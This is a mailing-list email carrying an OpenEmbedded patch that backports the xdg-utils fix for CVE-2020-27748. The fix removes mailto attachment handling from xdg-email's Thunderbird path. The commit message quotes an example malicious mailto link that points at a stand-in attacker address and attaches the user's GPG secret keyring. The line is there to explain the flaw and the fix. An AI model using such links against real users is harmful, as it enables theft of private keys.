Received: from mail-wm1-f44.google.com (mail-wm1-f44.google.com [209.85.128.44])
 by mx.groups.io with SMTP id smtpd.web12.4394.1630675943406974122
 for <openembedded-core@lists.openembedded.org>;
 Fri, 03 Sep 2021 06:32:23 -0700
Authentication-Results: mx.groups.io;
 dkim=pass header.i=@linuxfoundation.org header.s=google header.b=MUtAsVTU;
 spf=pass (domain: linuxfoundation.org, ip: 209.85.128.44, mailfrom: richard.purdie@linuxfoundation.org)
Received: by mail-wm1-f44.google.com with SMTP id k20-20020a05600c0b5400b002e87ad6956eso3597154wmr.1
        for <openembedded-core@lists.openembedded.org>; Fri, 03 Sep 2021 06:32:23 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=linuxfoundation.org; s=google;
        h=from:to:subject:date:message-id:mime-version
         :content-transfer-encoding;
        bh=69ZceQ/pU2/x9TpzpgRM/Sl0foxWNtFwoRm8zfAG5og=;
        b=MUtAsVTUWJh5TJX9FwigSVO5Kv37zysLxvn/AdAHiS68f6UsClIzH3aC7HNCy2ibHN
         Xi51CHhHDmNbCV/7tsuPJRd8zqvcF6gWimri4iWOjrjw+vbSk9xUTvKcDsQErWguheL5
         whBmkcwvk9CAKE0Yax+G8FftRSFfjhqTsIK9E=
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:from:to:subject:date:message-id:mime-version
         :content-transfer-encoding;
        bh=69ZceQ/pU2/x9TpzpgRM/Sl0foxWNtFwoRm8zfAG5og=;
        b=khw3RTt5ENNJxljQR7bMQu/kpqDLQFqQr9Vxdwo5LBeb6eVbgMv24WQINCPVHI41iW
         Fm48egvzV9XFReU5vwRzBIiUYJE6FETfH6mBYn5gi227PHDWWi6W47xhlpHIGttmr4rm
         cr05eL3FV49FVAYnCHC79xGgeHipgJf36P1afS0Zz0+QqZg2G+/yjnydlA9nIsy9dFME
         QtDBy74EK9T2KHB9/6qIiMofvaoddIt7J6pkpDN1WYRiyCTLIuj+9XNe7C/K70Us8T3S
         VZQmhlbIfjt5HvFeDzn3Q2fqvPSbL1sE4AuhjXgMSB0dBUaKSYi7OqRugzNVZw0BujXp
         8lHg==
X-Gm-Message-State: AOAM531lqUkw2Ub4x7pMjG/vLAxH44VJlPeC3UOd4E8Laf4Fk6hzuPNm
	QEpjg12crakwjKEHBDBX6oh6pS7ugFwJwg==
X-Google-Smtp-Source: ABdhPJwL/iUq35A5hraclfQJbTvhRe2HMnIWXXds2Rr8Y43woXGkL65K05S/lT9XDBmy5ZuPzs+b3Q==
X-Received: by 2002:a05:600c:350d:: with SMTP id h13mr449945wmq.38.1630675941516;
        Fri, 03 Sep 2021 06:32:21 -0700 (PDT)
Return-Path: <richard.purdie@linuxfoundation.org>
Received: from hex.int.rpsys.net ([2001:8b0:aba:5f3c:748d:fb86:ebb2:cea5])
        by smtp.gmail.com with ESMTPSA id d9sm5807829wrb.36.2021.09.03.06.32.20
        for <openembedded-core@lists.openembedded.org>
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Fri, 03 Sep 2021 06:32:21 -0700 (PDT)
From: "Richard Purdie" <richard.purdie@linuxfoundation.org>
To: openembedded-core@lists.openembedded.org
Subject: [PATCH] xdg-utils: Add fix for CVE-2020-27748
Date: Fri,  3 Sep 2021 14:32:20 +0100
Message-Id: <20210903133220.993486-1-richard.purdie@linuxfoundation.org>
X-Mailer: git-send-email 2.32.0
MIME-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit

Backport an upstream patch for the CVE.

Signed-off-by: Richard Purdie <richard.purdie@linuxfoundation.org>
---
 ...9813e0eb0246f63b54e9e154970e609575af.patch | 58 +++++++++++++++++++
 .../xdg-utils/xdg-utils_1.1.3.bb              |  1 +
 2 files changed, 59 insertions(+)
 create mode 100644 meta/recipes-extended/xdg-utils/xdg-utils/1f199813e0eb0246f63b54e9e154970e609575af.patch

diff --git a/meta/recipes-extended/xdg-utils/xdg-utils/1f199813e0eb0246f63b54e9e154970e609575af.patch b/meta/recipes-extended/xdg-utils/xdg-utils/1f199813e0eb0246f63b54e9e154970e609575af.patch
new file mode 100644
index 00000000000..948b9e22e93
--- /dev/null
+++ b/meta/recipes-extended/xdg-utils/xdg-utils/1f199813e0eb0246f63b54e9e154970e609575af.patch
@@ -0,0 +1,58 @@
+From 1f199813e0eb0246f63b54e9e154970e609575af Mon Sep 17 00:00:00 2001
+From: =?UTF-8?q?J=C3=B6rg=20Thalheim?= <joerg@thalheim.io>
+Date: Tue, 18 Aug 2020 16:52:24 +0100
+Subject: [PATCH] xdg-email: remove attachment handling from mailto
+MIME-Version: 1.0
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: 8bit
+
+This allows attacker to extract secrets from users:
+
+mailto:sid@evil.com?attach=/.gnupg/secring.gpg
+
+See also https://bugzilla.mozilla.org/show_bug.cgi?id=1613425
+and https://gitlab.freedesktop.org/xdg/xdg-utils/-/issues/177
+
+Signed-off-by: Jörg Thalheim <joerg@thalheim.io>
+---
+ scripts/xdg-email.in | 7 +------
+ 1 file changed, 1 insertion(+), 6 deletions(-)
+
+Upstream-Status: Backport
+CVE: CVE-2020-27748
+
+diff --git a/scripts/xdg-email.in b/scripts/xdg-email.in
+index 6db58ad..5d2f4f3 100644
+--- a/scripts/xdg-email.in
++++ b/scripts/xdg-email.in
+@@ -32,7 +32,7 @@ _USAGE
+ 
+ run_thunderbird()
+ {
+-    local THUNDERBIRD MAILTO NEWMAILTO TO CC BCC SUBJECT BODY ATTACH
++    local THUNDERBIRD MAILTO NEWMAILTO TO CC BCC SUBJECT BODY
+     THUNDERBIRD="$1"
+     MAILTO=$(echo "$2" | sed 's/^mailto://')
+     echo "$MAILTO" | grep -qs "^?"
+@@ -48,7 +48,6 @@ run_thunderbird()
+     BCC=$(/bin/echo -e $(echo "$MAILTO" | grep '^bcc=' | sed 's/^bcc=//;s/%\(..\)/\\x\1/g' | awk '{ printf "%s,",$0 }'))
+     SUBJECT=$(echo "$MAILTO" | grep '^subject=' | tail -n 1)
+     BODY=$(echo "$MAILTO" | grep '^body=' | tail -n 1)
+-    ATTACH=$(/bin/echo -e $(echo "$MAILTO" | grep '^attach=' | sed 's/^attach=//;s/%\(..\)/\\x\1/g' | awk '{ printf "%s,",$0 }' | sed 's/,$//'))
+ 
+     if [ -z "$TO" ] ; then
+         NEWMAILTO=
+@@ -68,10 +67,6 @@ run_thunderbird()
+         NEWMAILTO="${NEWMAILTO},$BODY"
+     fi
+ 
+-    if [ -n "$ATTACH" ] ; then
+-        NEWMAILTO="${NEWMAILTO},attachment='${ATTACH}'"
+-    fi
+-
+     NEWMAILTO=$(echo "$NEWMAILTO" | sed 's/^,//')
+     DEBUG 1 "Running $THUNDERBIRD -compose \"$NEWMAILTO\""
+     "$THUNDERBIRD" -compose "$NEWMAILTO"
+-- 
+GitLab
+
diff --git a/meta/recipes-extended/xdg-utils/xdg-utils_1.1.3.bb b/meta/recipes-extended/xdg-utils/xdg-utils_1.1.3.bb
index 108e7b8c4c2..73acf6b744e 100644
--- a/meta/recipes-extended/xdg-utils/xdg-utils_1.1.3.bb
+++ b/meta/recipes-extended/xdg-utils/xdg-utils_1.1.3.bb
@@ -20,6 +20,7 @@ LIC_FILES_CHKSUM = "file://LICENSE;md5=a5367a90934098d6b05af3b746405014"
 SRC_URI = "https://portland.freedesktop.org/download/${BPN}-${PV}.tar.gz \
            file://0001-Reinstate-xdg-terminal.patch \
            file://0001-Don-t-build-the-in-script-manual.patch \
+           file://1f199813e0eb0246f63b54e9e154970e609575af.patch \
           "
 
 SRC_URI[md5sum] = "902042508b626027a3709d105f0b63ff"
-- 
2.32.0

